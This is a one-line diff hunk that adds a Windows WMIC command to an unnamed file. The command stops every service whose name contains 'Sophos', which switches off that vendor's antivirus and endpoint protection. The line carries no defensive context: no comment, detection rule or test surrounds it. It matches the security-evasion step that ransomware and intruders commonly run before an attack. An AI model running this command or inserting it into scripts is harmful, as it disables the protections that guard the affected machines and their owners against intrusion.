@@ -1,0 +1,1 @@
+wmic service where "caption like '%Sophos%'" call stopservice
